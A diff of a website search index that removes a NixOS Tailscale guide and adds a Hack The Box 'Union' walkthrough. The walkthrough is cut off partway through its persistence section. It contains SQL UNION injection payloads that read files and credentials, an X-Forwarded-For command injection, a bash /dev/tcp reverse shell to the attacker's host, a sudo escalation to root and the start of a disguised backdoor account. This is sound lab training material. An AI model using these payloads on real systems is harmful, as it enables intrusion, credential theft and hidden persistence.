@@ -557,13 +557,6 @@ window.store = {
         "url": "http:\/\/localhost:1313\/author\/"
     },
     
-    "http:\/\/localhost:1313\/homelab\/202050222_tailscalenixos\/": {
-        "title": "Autostart Tailscale on NixOS system boot \u0026 rebuild with mullvad integration",
-        "tags": ["nixos","tailscale","homelab","networking","vpn","system","configuration",],
-        "content": "This was originally posted on 2025-02-23 however I have since added the mullvad integration into this so have updated the guide to reflect this.\n+Note+: You do not need the mullvad integration for this to work, I have highlighted the arguments to add if you are going to use mullvad. Are you tired of running sudo tailscale up every time you login, I know I am. So I thought why spend under two seconds waiting for something to run and using auto complete with ZSH to easily find the command when I can easily create a service that launches Tailscale on boot for me and re-launches on every rebuild of the system.\nThis configuration will ensure that:\nTailscale starts automatically with your system. You don\u0026rsquo;t need to manually authenticate each time. Your authentication key is stored securely using sops /sops-nix The connection is established only when needed (won\u0026rsquo;t try to reconnect if already connected). All non lan traffic is routed over mullvad. This assumes you already have a Tailscale account with the mullvad extension and sops setup, if you don\u0026rsquo;t please see guides below.\nTailscale quick start guide Install sops-nix Generating The Tailscale Auth Key: As we want to automate the process of authenticating of connecting our NixOS host to the Tailscale network we will need to generate an auth key. This will mean we do not have to follow the provided Tailscale links when adding the host to the network or re-authorizing. +Note+: Even if you have already added your host to the Tailscale network this process is still the same. Login to your account and click \u0026ldquo;Settings\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Personal Settings\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Keys\u0026rdquo; \u0026ndash;\u0026gt; \u0026ldquo;Generate Auth Key\u0026rdquo;\nKey settings, give your key a memorable name and also set it for the amount of time you want it to be valid for, I have set it for the max 90 days have added a reminder to my todo list to regenerate one in 85 days.\nYou should now have a Tailscale auth key.\nAdding Tailscale Auth Key To Sops: It\u0026rsquo;s now time to add our Tailscale Auth Key to sops so our system has access to it.\n# If your sops file is called something different obviously you need to enter that... sops secrets.yaml # Store it in this format is important as we will be calling it later as a variable tailscale_preauth: | TAILSCALE_AUTH_KEY=tskey-auth-xxxxx-xxxxxxxxxxxxx +Note+: It is also possible to use age for this however I personally use stops as it also allows integration with home-manager. Edit your configuration.nix and add the secret so it\u0026rsquo;s accessible by other services.\nsops = { defaultSopsFile = ./packages/sops/secrets.yaml; age.keyFile = \u0026#34;/home/martin/.config/sops/age/keys.txt\u0026#34;; # I have other sops secerts here but have removed for brevity secrets.tailscale_preauth = { }; }; +Important+: The part secrets.tailscale_preauth has to match name that was placed into the sops secrets.yaml as this is the key for the value referenced. So if in your sops secrets file you called it ts-key you would write secrets.ts-key +Note+: This has to be done in configuration.nix \u0026amp; not home-manager as this is a system wide service that is running and not a user specific service. Choosing a mullvad exit node for tailscale. If you are planning on using mullvad please ensure you add the service (it\u0026rsquo;s chargeable) by following the tailscale documentation here .\nYou will also need to select an exit node. You can do this by running one of the following commands.\n# Get list of exit nodes tailscale exit-node list # Get a list of exit nodes by country tailscale exit-node list --filter=[country name] #Example tailscale exit-node list --filter=USA # You can also get tailscale to suggest an exit node tailscale exit-node suggest Now that you have an exit node, take a note of it.\nCreating The Tailscale Service: Edit your NixOS configuration.nix and add the below service. # Add tailscale to your system packages environment.systemPackages = [ pkgs.tailscale ]; # Enable the tailscale service services.tailscale.enable = true; #Required for resolution when using mullvad. services.tailscale.useRoutingFeatures = \u0026#34;client\u0026#34;; # Create a oneshot to autoconnect on rebuild/switch systemd.services.tailscale-autoconnect = { description = \u0026#34;Automatic connection to Tailscale\u0026#34;; after = [ \u0026#34;network-pre.target\u0026#34; \u0026#34;tailscale.service\u0026#34; ]; wants = [ \u0026#34;network-pre.target\u0026#34; \u0026#34;tailscale.service\u0026#34; ]; wantedBy = [ \u0026#34;multi-user.target\u0026#34; ]; serviceConfig = { Type = \u0026#34;oneshot\u0026#34;; # Pass our tailscale auth key from sops as a Environmental Variable EnvironmentFile = config.sops.secrets.tailscale_preauth.path; }; # have the job run this shell script script = with pkgs; \u0026#39;\u0026#39; # wait for tailscaled to settle sleep 2 # check if we are already authenticated to tailscale status=\u0026#34;$(${tailscale}/bin/tailscale status -json | ${jq}/bin/jq -r .BackendState)\u0026#34; if [ $status = \u0026#34;Running\u0026#34; ]; then # if so, then do nothing exit 0 fi # otherwise authenticate with tailscale using the key from secrets # Not using mullvad exit node: ${tailscale}/bin/tailscale up -authkey \u0026#34;$TAILSCALE_AUTH_KEY\u0026#34; --accept-routes=true --reset # Using mullvad exit node: # ${tailscale}/bin/tailscale up -authkey \u0026#34;$TAILSCALE_AUTH_KEY\u0026#34; --exit-node-allow-lan-access --exit-node=gb-mnc-wg-201.mullvad.ts.net --accept-routes=true --reset --acccept-dns=true` \u0026#39;\u0026#39;; }; +Important+: As stated before if you have called your Tailscale Auth key in your secrets file something other than tailscale_preauth you will then have to modify the line below. # Pass our tailscale auth key from sops as a Environmental Variable EnvironmentFile = config.sops.secrets.tailscale_preauth.path; Breaking Down The Configuration: Let\u0026rsquo;s break down what each part of this configuration does:\nSystem Package and Service Setup:\nenvironment.systemPackages = [ pkgs.tailscale ] adds the Tailscale package to your system services.tailscale.enable = true enables the Tailscale daemon service services.tailscale.useRoutingFeatures = \u0026quot;client\u0026quot;; The article in the NixOS Wiki about tailscale explains this better If you are using features like subnet routers or exit nodes you will also need to set services.tailscale.useRoutingFeatures to \u0026ldquo;server\u0026rdquo;, \u0026ldquo;client\u0026rdquo; or \u0026ldquo;both\u0026rdquo; depending on the role of your machine.\nAs we are a client in this situation we will set it as client. Automatic Connection Service: The systemd.services.tailscale-autoconnect section creates a systemd service that:\nRuns once during system startup (Type = \u0026quot;oneshot\u0026quot;) Starts after networking and the Tailscale daemon are ready Loads your authentication key from the sops-encrypted file ${tailscale}/bin/tailscale up -authkey \u0026quot;$TAILSCALE_AUTH_KEY\u0026quot; --accept-routes=true Connection Script Logic: The script section:\nWaits 2 seconds for the Tailscale daemon to fully start sleep 2 Checks if you\u0026rsquo;re already connected to Tailscale by querying its status. status=\u0026quot;$(${tailscale}/bin/tailscale status -json | ${jq}/bin/jq -r .BackendState)\u0026quot; If already connected (Running state), exits without doing anything. if [ $status = \u0026quot;Running\u0026quot; ]; then # if so, then do nothing If not connected, authenticates using your stored auth key and passing the relevant arguments. If you are not using mullvad use this one! tailscale up -authkey \u0026quot;$TAILSCALE_AUTH_KEY\u0026quot; --accept-routes=true --reset +Note+: I also use some of my nodes as routers within my home network to allow access to other hosts so I also pass the --accept-routes=true argument, however if you don\u0026rsquo;t do this you can omit this argument. If you are using mullvad use this one! tailscale up -authkey \u0026quot;$TAILSCALE_AUTH_KEY\u0026quot; --exit-node-allow-lan-access --exit-node=gb-mnc-wg-201.mullvad.ts.net --accept-routes=true --reset --acccept-dns=true +Note+: Ensure you add the exit node you have chosen. Rebuilding The System: That\u0026rsquo;s it now run either:\nsudo nixos-rebuild switch flake [location/of/flake] sudo nixos-rebuild switch Check Tailscale is running \u0026amp; connected\n+Note+: If you have already had this service running a you will need to actually run a manual tailscale command too:\nsudo tailscale up --accept-dns=true --accept-routes --exit-node=gb-mnc-wg-201.mullvad.ts.net --exit-node-allow-lan-access --reset ", 
-        "url": "http:\/\/localhost:1313\/homelab\/202050222_tailscalenixos\/"
-    },
-    
     "http:\/\/localhost:1313\/author\/bloodstiller\/": {
         "title": "Bloodstiller",
         "tags": [],
@@ -576,6 +569,139 @@ window.store = {
         "tags": [],
         "content": "", 
         "url": "http:\/\/localhost:1313\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/box\/": {
+        "title": "Box",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/box\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/command\/": {
+        "title": "Command",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/command\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/groupconcat\/": {
+        "title": "GroupConcat",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/groupconcat\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/header\/": {
+        "title": "Header",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/header\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/headers\/": {
+        "title": "Headers",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/headers\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/htb\/": {
+        "title": "HTB",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/htb\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/http\/": {
+        "title": "HTTP",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/http\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/injection\/": {
+        "title": "Injection",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/injection\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/linux\/": {
+        "title": "Linux",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/linux\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/medium\/": {
+        "title": "Medium",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/medium\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/mysql\/": {
+        "title": "MySQL",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/mysql\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/php\/": {
+        "title": "PHP",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/php\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/sql\/": {
+        "title": "SQL",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/sql\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/": {
+        "title": "Tags",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/"
+    },
+    
+    "http:\/\/localhost:1313\/tags\/union\/": {
+        "title": "UNION",
+        "tags": [],
+        "content": "", 
+        "url": "http:\/\/localhost:1313\/tags\/union\/"
+    },
+    
+    "http:\/\/localhost:1313\/walkthroughs\/union-box\/": {
+        "title": "Union HTB Walkthrough",
+        "tags": ["Box","HTB","Medium","MySQL","UNION","SQL","GroupConcat","Linux","Web","Command","Header","Injection","HTTP","Headers","PHP",],
+        "content": "Union Hack The Box Walkthrough/Writeup: https://app.hackthebox.com/machines/Union How I use variables \u0026amp; Wordlists: Variables:\nIn my commands you are going to see me use $box, $user, $hash, $domain, $pass often. I find the easiest way to eliminate type-os \u0026amp; to streamline my process it is easier to store important information in variables \u0026amp; aliases. $box = The IP of the box $pass = Passwords I have access to. $user = current user I am enumerating with. Depending on where I am in the process this can change if I move laterally. $domain = the domain name e.g. sugarape.local or contoso.local $machine = the machine name e.g. DC01 Why am I telling you this? People of all different levels read these writeups/walkthroughs and I want to make it as easy as possible for people to follow along and take in valuable information. Wordlists:\nI have symlinks all setup so I can get to my passwords from ~/Wordlists so if you see me using that path that\u0026rsquo;s why. If you are on Kali and following on, you will need to go to /usr/share/wordlists I also use these additional wordlists: Statistically-likely-usernames SecLists Auto_Wordlists 1. Enumeration: NMAP: Basic Scans: TCP:\n#Command nmap $box -Pn -oA TCPbasicScan #Results Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 06:41 BST Nmap scan report for 10.129.96.75 Host is up (0.024s latency). Not shown: 999 filtered tcp ports (no-response) PORT STATE SERVICE 80/tcp open https://app.hackthebox.com/machines/Union Nmap done: 1 IP address (1 host up) scanned in 8.40 seconds Initial thoughts: Only 80 open so we are going after that it would appear.\nComprehensive Scans: #Command sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP #Results ┌─(...loodstiller/content-org/Walkthroughs/HTB/Boxes/BlogEntriesMade/Union/scans/nmap)───(kali@kali:pts/3)─┐ └─(06:44:45 on main ✹ ✭)──\u0026gt; sudo nmap -p- -sV -sC -O -Pn --disable-arp-ping $box -oA FullTCP Starting Nmap 7.95 ( https://nmap.org ) at 2025-08-10 06:44 BST Nmap scan report for 10.129.96.75 Host is up (0.027s latency). Not shown: 65534 filtered tcp ports (no-response) PORT STATE SERVICE VERSION 80/tcp open http nginx 1.18.0 (Ubuntu) |_http-title: Site doesn\u0026#39;t have a title (text/html; charset=UTF-8). | http-cookie-flags: | /: | PHPSESSID: |_ httponly flag not set |_http-server-header: nginx/1.18.0 (Ubuntu) Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port Device type: general purpose|router Running (JUST GUESSING): Linux 4.X|5.X|2.6.X|3.X (97%), MikroTik RouterOS 7.X (97%) OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5 cpe:/o:mikrotik:routeros:7 cpe:/o:linux:linux_kernel:5.6.3 cpe:/o:linux:linux_kernel:2.6 cpe:/o:linux:linux_kernel:3 cpe:/o:linux:linux_kernel:6.0 Aggressive OS guesses: Linux 4.15 - 5.19 (97%), Linux 5.0 - 5.14 (97%), MikroTik RouterOS 7.2 - 7.5 (Linux 5.6.3) (97%), Linux 2.6.32 - 3.13 (91%), Linux 3.10 - 4.11 (91%), Linux 3.2 - 4.14 (91%), Linux 3.4 - 3.10 (91%), Linux 4.15 (91%), Linux 2.6.32 - 3.10 (91%), Linux 4.19 - 5.15 (91%) No exact OS matches for host (test conditions non-ideal). Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ . Nmap done: 1 IP address (1 host up) scanned in 166.40 seconds Findings: We can see the server is running: nginx 1.18.0 Ubuntu PHP (but no session ID is being set) Web 80: WhatWeb: Lets run WhatWeb to see if I can glean some further information.\n#Command whatweb http://$box | sed \u0026#39;s/, /\\n/g\u0026#39; #Output http://10.129.96.75 [200 OK] Bootstrap[4.1.1] Cookies[PHPSESSID] Country[RESERVED][ZZ] HTTPServer[Ubuntu Linux][nginx/1.18.0 (Ubuntu)] IP[10.129.96.75] JQuery[3.2.1] Script nginx[1.18.0] Results:\nAgain just seeing what we saw before in nmap. Note: I use sed to display the output across multiple lines for easier readability.\nDirbusting The Webserver Running Using FFUF: We can perform some directory busting to see if there are any interesting directories.\nffuf -w /usr/share/wordlists/seclists/Discovery/Web-Content/combined_directories.txt -u http://$box/FUZZ -ic Nothing of value was found. Enumerating Injection Points With Burpsuite: Web Enumeration via Burp Suite: When manually enumerating a Website, always use Burp Suite. This allows you to: Record all potential injection points. Capture relevant responses for each request, making it easier to analyze vulnerabilities and track your testing progress. Finding An SQL Injection Point: Visiting the site we can see it allows us to check if a player is eligible for a qualifier. Looking at the code for the function on the page, by using inspect, we can see it\u0026rsquo;s a POST request that sends the data string player= + the string provided by the user using string concatenation. This unsanitized user input is being sent to index.php, which could potentially lead to SQL injection if the server-side code constructs database queries using this parameter without proper sanitization.\n$(function () { $(\u0026#39;form\u0026#39;).on(\u0026#39;submit\u0026#39;, function (e) { e.preventDefault(); $.ajax({ type: \u0026#39;post\u0026#39;, url: \u0026#39;index.php\u0026#39;, data: \u0026#39;player=\u0026#39; + document.getElementsByName(\u0026#39;player\u0026#39;)[0].value, async: true, success: function (data) { $(\u0026#39;#output\u0026#39;).html(\u0026#34;\u0026#34;); $(\u0026#39;#output\u0026#39;).append(data); } }); }); 2. Foothold: Using An SQL Union Injection Attack To Enumerate The Database: As we know the player string is being passed with string concatenation to construct it we can use this as a means to append another query onto the this query to enumerate the database.\nI used the standard query below to enumerate the version of SQL being run.\n\u0026#39; UNION SELECT @@version# If you are not familiar with SQLi UNION injection attacks here is a very brief overview to provide context.\nNote: Standard testing queries like using a single quote ' will not trigger an error in this specific instance. This could be because the application is handling single quotes in a way that prevents visible syntax errors, but still allows query modification through UNION SELECT.\nSide Quest: What is the UNION operator in SQL? The UNION operator allows us to combine two queries together. We can use it to add a malicious query to the end of a legitimate query used by the system.\nFor example we can assume from the code we have seen that our user input is taken in the \u0026ldquo;Player Eligibility Check\u0026rdquo; box and then run against the database using a query similar to the below (this is speculation, we cannot know the exact query being run, but we can infer).\n--Command SELECT player FROM eligiblePlayers WHERE name = \u0026#39;[ourInput]\u0026#39; --Example SELECT player FROM eligiblePlayers WHERE name = \u0026#39;test\u0026#39; We can then use the UNION operator to append a query onto this legitimate query.\n--Command \u0026#39; UNION SELECT [ourQuery]# --Example SELECT player FROM eligiblePlayers WHERE name = \u0026#39;\u0026#39; UNION SELECT @@version# Breakdown: ' closes the existing string. UNION SELECT starts the injected query. @@version returns the database version (works in MySQL \u0026amp; MS SQL). # comments out the rest of the original query. We can easily query what type of database is in use, by using the below strings.\nDatabase Type Query Microsoft, MySQL SELECT @@version Oracle SELECT * FROM v$version PostgreSQL SELECT version() As we can see from the handy table the string @@version works on both MySQL and Microsoft SQL, we can safely assume that as this is a Linux box it will be MySQL, however that is not guaranteed.\nIf you want to learn more about SQLi or web vulnerability testing in general I would recommend the free portswigger academy training .\nEstablishing How Many Columns The Query Original Query Has: We kind of skipped over this earlier, but when performing a UNION injection attack we first need to figure out how many columns the original query returns, because both queries must have the same number of columns.\nA UNION injection has two key requirements:\nSame number of columns: We must match the original query’s column count exactly. Compatible data types: Each column in the injected query must have a data type compatible with the original query. Since we’ve already successfully output the database version number, we know the original query has only one column. But let’s verify that by testing.\nTo verify this we can run the below query.\n\u0026#39; UNION SELECT NULL# NULL is a safe choice here because it can be implicitly cast to any data type, meaning it won’t cause type mismatch errors during testing. And as we can see from requirement 2 we need \u0026ldquo;Compatible data types\u0026rdquo;. The response says we are \u0026ldquo;not eligible due to already qualifying.”, which is odd, right? Most likely, the NULL value is being cast to a string and checked against a list of player names (our assumed target table).\nLets add another NULL to see if there is a second column (we know there is not but let\u0026rsquo;s do this so you can see what is happening.)\n\u0026#39; UNION SELECT NULL,NULl# The output changes again, which confirms what we suspected: the target query only returns one column.\nEnumerating Tables Using SQLi. Now that we know we have found an injection point and established the query has 1 column lets enumerate further. We already determined earlier that the original query returns 1 column, so our injected query also returns 1 column to match.\nMost databases, apart from Oracle, provide a special set of read-only views called the Information Schema. These contain metadata about the database such as tables, columns, etc. Oracle however, uses a different set of views (ALL_TABLES, USER_TABLES, DBA_TABLES).\nWe can use these views to view all the tables (and other information the database contains).\nWe can view the tables in the database by running the following query.\n\u0026#39; UNION SELECT TABLE_NAME FROM information_schema.tables# As we can see there is a table called ADMINISTRABLE_ROLE_AUTHORIZATIONS, but that is just an inbuilt table within MySQL. We can see a full list of inbuilt tables using MySQL\u0026rsquo;s documentation here here . However for ease here is screenshot showing only a fraction of the in built tables. As you can see there are a lot, however we can only see one, this is due to the output being one cell. Luckily we can use some handy tricks to get around this.\nUsing GROUP_CONCAT() to view all tables: As you saw there are lots of built in tables.\nOne option for us to view all the tables is use the LIMIT 1 OFFSET option.\n\u0026#39; UNION SELECT TABLE_NAME FROM information_schema.tables LIMIT 1 OFFSET 0# We can then increment the offset by a value of 1 to step through the list of tables.\n\u0026#39; UNION SELECT TABLE_NAME FROM information_schema.tables LIMIT 1 OFFSET 1# However that is going to take a LONG time and we would need to step through all the inbuilt tables still or guess where they end.\nInstead we can use the GROUP_CONCAT() function, which will allow us to group all the table names together concatenating them into one output, which is good as we have one cell.\n\u0026#39; UNION SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables# As we can see the string extends beyond the bounds of the site; if we take a look in burpsuite, we can see the complete list there. You may notice though near the end that there is a string that says \u0026ldquo;ROUTI\u0026rdquo; this is due to the fact that the GROUP_CONCAT(), in MySQL function having a default character limit length of 1024 characters.\nNote: If the database account has the required permissions, this limit can be increased to capture more results in a single output:\nSET SESSION group_concat_max_len = 32768; This can be especially helpful in CTFs or lab environments, but is less likely to work in hardened production systems.\nYou can also see that we have not even gotten past the inbuilt tables still.\nLuckily we can further refine this statement to exclude all built in tables by using the NOT IN clause.\nIn MySQL, the table_schema column in information_schema.tables represents the database schema that each table belongs to. By excluding the system schemas, mysql, information_schema, performance_schema and sys we can filter the results down to only user created tables.\n\u0026#39; UNION SELECT GROUP_CONCAT(TABLE_NAME) FROM information_schema.tables WHERE table_schema NOT IN (\u0026#39;mysql\u0026#39;, \u0026#39;information_schema\u0026#39;, \u0026#39;performance_schema\u0026#39;, \u0026#39;sys\u0026#39;)# As you can see there are only two non default tables, flag \u0026amp; players\nEnumerating Column Names In Player \u0026amp; Flag Tables: Again we can use the GROUP_CONCAT() function to extract all column names at once.\n\u0026#39; UNION SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_name = \u0026#39;flag\u0026#39;# We can see there is a column called one\nLet\u0026rsquo;s check the players table columns now.\n\u0026#39; UNION SELECT GROUP_CONCAT(COLUMN_NAME) FROM information_schema.columns WHERE table_name = \u0026#39;players\u0026#39;# We can see this has a single column called player\nLet\u0026rsquo;s read the contents of these columns.\nExtracting Data From The Database Columns Via Union Injection? Again we can use the GROUP_CONCAT() function to extract all the data from the columns also.\n\u0026#39; UNION SELECT GROUP_CONCAT(player) FROM players# We can see it contains a list of registered players, we will take a note of these for later in case we need them.\nLet\u0026rsquo;s check the flag column data now.\n\u0026#39; UNION SELECT GROUP_CONCAT(one) FROM flag# This gives us the flag string for the challenge UHC{F1rst_5tep_2_Qualify}\nGetting SSH Access With The Flag String: If we enter a random name into the eligibility checker, we are provided a link to complete a challenge. If we click that link we are prompted to enter the first flag. If we enter the flag from the table We are given ssh access to the box.\nNote: If you go back to the box or have to get ssh access again after a prolonged period of time, re-enter the flag as it appears ssh access will timeout after a while.\nI try the usernames we are provided from the list however there is a password prompt \u0026amp; the flag or usernames do not work, so I think we need to dig a little further.\nLet\u0026rsquo;s see if we can read any of the files on the host via sqli.\nReading Host Files VIA SQLi: First lets establish if we can read from the host via the db, we will use a world readable file to do this, /etc/passwd\n\u0026#39; UNION SELECT LOAD_FILE(\u0026#34;/etc/passwd\u0026#34;)# We can read from the host!\nLooking at the output in burpsuite we can filter for the string sh and we can see that there are three interesting users, root, htb \u0026amp; uhc. Let\u0026rsquo;s keep digging and see what else we can find.\nEnumerating The Web Directory: As this is running nginx the typical folder structure for storing files is /var/www/html/[file].php\nSending the payload\n\u0026#39; UNION SELECT LOAD_FILE(\u0026#34;/var/www/html/index.php\u0026#34;)# We can see that there is some SQLMap mitigation logic as well as the actual query being run on the database.\nLet\u0026rsquo;s fuzz this to see what else we can find.\nFirst we will grab the relevant headers and cookies from the request.\n\u0026#34;X-Requested-With: XMLHttpRequest\u0026#34; \\ \u0026#34;Content-Type: application/x-www-form-urlencoded; charset=UTF-8\u0026#34; \\ \u0026#34;Cookie: PHPSESSID=vdtvo4k8cnj42f08tq2fj7kcb0\u0026#34; \\ We do this as the PHPSESSID is required in order for us to interact with the\nWe can now construct our ffuf command.\nffuf \\ -w ~/Wordlists/seclists/Discovery/Web-Content/raft-large-words.txt:FUZZ \\ -u http://$box/index.php \\ -x http://127.0.0.1:8080 \\ -X POST \\ -d \u0026#34;player=\u0026#39; UNION SELECT LOAD_FILE(\u0026#39;/var/www/html/FUZZ.php\u0026#39;)#\u0026#34; \\ -H \u0026#34;X-Requested-With: XMLHttpRequest\u0026#34; \\ -H \u0026#34;Content-Type: application/x-www-form-urlencoded\u0026#34; \\ -H \u0026#34;Cookie: PHPSESSID=vdtvo4k8cnj42f08tq2fj7kcb0\u0026#34; \\ -fw 10 When fuzzing this SQL injection payload with **ffuf**, we include these specific headers so that our requests look and behave like the legitimate requests the application expects.\nX-Requested-With: XMLHttpRequest Many web applications distinguish between normal page loads and AJAX (JavaScript) requests. This header is commonly sent by JavaScript frameworks like jQuery to signal that the request came from an AJAX call Without it, the server might return a full HTML page instead of the smaller JSON or partial HTML response we expect, or it might even block the request entirely.\nContent-Type: application/x-www-form-urlencoded This tells the server how the POST body is formatted. Since we’re sending form data (player=' UNION SELECT...), the server needs to know it’s URL-encoded form data rather than JSON or multipart data. Some servers reject POST data without the expected Content-Type.\nCookie: PHPSESSID=... This keeps our session alive. If the application requires authentication or session tracking, sending the PHPSESSID ensures our requests are processed with the correct permissions. Without it, we might get redirected to a login page or receive a “not authorized” error, breaking the fuzzing process.\nWhy all this matters for fuzzing The goal is to test only the part of the request we’re fuzzing—in this case, the filename inside LOAD_FILE('/var/www/html/FUZZ.php'). If we don’t send the same headers the browser normally would, we might get false negatives because the server rejects our requests before they even reach the vulnerable code. By replicating a valid, working request exactly (headers, cookies, format), we ensure our fuzz results reflect real server behavior.\nWe get alot of hits, but the main one that appears the most interesting is the standard config.php Finding Credentials in config.php: Checking the file in burpsuite we can see the credentials for the user uhc These credentials are used for the connecting to the database. uhc-11qual-global-pw\nLet\u0026rsquo;s test them for SSH access to ensure they work. They do.\nLet\u0026rsquo;s grab our user flag. 3. Privilege Escalation: Looking around as our user there is not much we can do. We cannot access sudo and there are no new interesting files.\nWe can also access the htb user\u0026rsquo;s home directory but there is nothing of note there either.\nLet\u0026rsquo;s go back to what we do know, the files in the web directory.\nFinding A Sudo Call in firewall.php: Looking at firewall.php we can see the below lines.\n\u0026lt;?php if (isset($_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;])) { $ip = $_SERVER[\u0026#39;HTTP_X_FORWARDED_FOR\u0026#39;]; } else { $ip = $_SERVER[\u0026#39;REMOTE_ADDR\u0026#39;]; }; system(\u0026#34;sudo /usr/sbin/iptables -A INPUT -s \u0026#34; . $ip . \u0026#34; -j ACCEPT\u0026#34;); ?\u0026gt; The most interesting part here is the sudo call to iptables. It’s adding our IP address to the ACCEPT list, so we can SSH in after submitting the flag.\nNotice how it takes the IP address from the HTTP_X_FORWARDED_FOR variable with no input sanitization. This means we may be able to craft a malicious payload that injects extra commands, resulting in command injection via unsanitized header input.\nSide Quest: What is HTTP_X_FORWARDED_FOR doing? HTTP_X_FORWARDED_FOR is a PHP server environment variable that contains the value of the X-Forwarded-For HTTP header. It’s often used to record the original client IP address when the request passes through a proxy or load balancer.\nWe can find out more information about the header by checking Mozilla\u0026rsquo;s documentation here we can see it says.\nThe HTTP X-Forwarded-For (XFF) request header is a de-facto standard header for identifying the originating IP address of a client connecting to a web server through a proxy server.\nBut why is this dangerous? I am so glad you asked! Because the X-Forwarded-For header is controlled by the client, which means us as an attacker can insert arbitrary text. Without sanitization, that text gets concatenated into the system() call, and when sudo runs it, the injected command runs with elevated privileges.\nCrafting Our POC Payload: For a simple POC we are going to use a curl command to grab the contents of a python http server we control.\nSetup our Server: First of all lets setup our python http server.\npython3 -m http.server 9000 Crafting The Malicious Payload: The vulnerable PHP code runs:\nsystem(\u0026#34;sudo /usr/sbin/iptables -A INPUT -s \u0026#34; . $ip . \u0026#34; -j ACCEPT\u0026#34;); Since $ip comes directly from the X-Forwarded-For header, we can inject extra commands after a valid IP address.\nWe want to run: curl http://[ourServer]:9000/POC\nAs we are inserting our payload into the existing command string, we need to be very specific with our syntax.\nProvide a valid IP address: The PHP code is expecting an IP address, so we start with ours: 10.10.14.22\nAppend a command separator: We use the ; operator to terminate the IP argument and start a new command: 10.10.14.22;\nCall bash to spawn a subshell: Using bash -c allows us to run our payload inside a separate process for more control: 10.10.14.22; bash -c\nAdd the actual curl command: This is the command we want to execute: 10.10.14.22; bash -c \u0026quot;curl http://10.10.14.22:9000/POC\u0026quot;\nRedirect input to prevent hangs: We send any errors to stderr using 0\u0026lt;\u0026amp;1 so the request doesn\u0026rsquo;t hang if there’s a problem: 10.10.14.22; bash -c \u0026quot;curl http://10.10.14.22:9000/POC 0\u0026lt;\u0026amp;1\u0026quot;\nAppend another ; so the rest of the original command runs: This ensures the iptables command completes as intended: 10.10.14.22; bash -c \u0026quot;curl http://10.10.14.22:9000/POC 0\u0026lt;\u0026amp;1\u0026quot;;\nWhen the PHP code runs, the final system command looks like this:\nsystem(\u0026#34;sudo /usr/sbin/iptables -A INPUT -s \u0026#34; . 10.10.14.22; bash -c \u0026#34;curl http://10.10.14.22:9000/POC 0\u0026lt;\u0026amp;1\u0026#34;; . \u0026#34; -j ACCEPT\u0026#34;); Sending Our Payload: Now we need to intercept a GET request from the site to firewall.php so we can pass this. Let\u0026rsquo;s go back to burp.\nWe navigate to http://10.129.96.75/challenge.php and enter the flag UHC{F1rst_5tep_2_Qualify} we retrieved via SQLi Union Injection earlier to trigger the post request to add our IP to the host.\nIn burp we can press CTRL+R and send to repeater. We are going to insert out payload\nx-forwarded-for: 10.10.14.22; bash -c \u0026#34;curl http://10.10.14.22:9000/POC 0\u0026lt;\u0026amp;1\u0026#34;; We can see we get a response straight away and it connects so we have command execution. If you want you can also see it rendered on the page too. Getting A Reverse Shell Via Header Command Injection: Using the same format as before we should be able to get a reverse shell.\nLet\u0026rsquo;s start our listener.\nnc -nvlp 80 And send our payload.\nx-forwarded-for: 10.10.14.22; bash -c \u0026#34;/bin/bash -i \u0026gt;\u0026amp; /dev/tcp/10.10.14.22/80 0\u0026gt;\u0026amp;1\u0026#34;; We get our shell as the user www-data.\nThe shell is pretty unstable so let\u0026rsquo;s upgrade it using python.\npython3 -c \u0026#39;import pty; pty.spawn(\u0026#34;/bin/bash\u0026#34;)\u0026#39; Elevating To root Via Overly Permissive sudo Permissions: If we check what commands the user www-data using can run as root using sudo -l we can see that they can run all commands without a password. This means we can easily switch to a root shell using\nsudo /bin/bash Let\u0026rsquo;s get our flag 4. Persistence: It wouldn\u0026rsquo;t be a write up without some simple form of persistence would it?\nCreating a high privileged \u0026ldquo;service\u0026rdquo; account for persistence: We can create an account called \u0026ldquo;nginx\u0026rdquo; and give ourselves root privileges \u0026amp; access to the bash shell. We will use this name as it\u0026rsquo;s one you could see on a 